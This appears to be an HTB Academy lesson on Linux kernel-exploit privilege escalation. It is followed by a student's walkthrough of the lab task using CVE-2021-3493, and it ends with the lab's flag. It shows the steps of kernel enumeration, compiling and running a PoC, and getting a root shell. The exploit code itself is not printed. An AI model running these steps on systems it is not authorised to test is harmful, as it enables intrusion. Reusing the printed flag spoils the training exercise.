Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges. It is very common to find systems that are vulnerable to kernel exploits. It can be hard to keep track of legacy systems, and they may be excluded from patching due to compatibility issues with certain services or applications.

Privilege escalation using a kernel exploit can be as simple as downloading, compiling, and running it. Some of these exploits work out of the box, while others require modification. A quick way to identify exploits is to issue the command `uname -a` and search Google for the kernel version.

Note: Kernel exploits can cause system instability so use caution when running these against a production system.

## Kernel Exploit Example

Let's start by checking the Kernel level and Linux OS version.

```shell-session
KaoruRyusaki@htb[/htb]$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```shell-session
KaoruRyusaki@htb[/htb]$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Next download it to the system using `wget` or another file transfer method. We can compile the exploit code using [gcc](https://linux.die.net/man/1/gcc) and set the executable bit using `chmod +x`.

```shell-session
KaoruRyusaki@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

Next, we run the exploit and hopefully get dropped into a root shell.

```shell-session
KaoruRyusaki@htb[/htb]$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

Finally, we can confirm root access to the box.

```shell-session
root@htb[/htb]# whoami

root
```

Note: The target system has been updated, but is still vulnerable. Use a kernel exploit created in 2021.




#### Question

Escalate privileges using a different Kernel exploit. Submit the contents of the flag.txt file in the /root/kernel_exploit directory.

* Download the VPN file from the HTB Academy webpage
* Open your VM and go to your Downloads page from the terminal
* Run the command " openvpn academy-regular.ovpn " (if it doesnt work try running the same command with sudo)
* Use the user and password given by HTB and then SSH to the target system spawned for you by running this command "ssh htb-student@\<ip given>\"
* Run both commands " uname -a" and  " cat /etc/lsb-release  ", based on the information you will realize the kernel version of the shell is " linux 4.15 " and the OS is " Ubuntu 18.04.6 LTS "
* using that info on Google will find you a vulnerability with the reference CVE-2021-3493
* Look for the code and paste it in a file on the shell
* Compile it as " gcc kernelexp.c -o kernelexp " and run the script as "./kernelexp "
* As root, go to the folder " /root/kernel_exploits" and open the flag file
* 46237b8aa523bc7e0365de09c0c0164f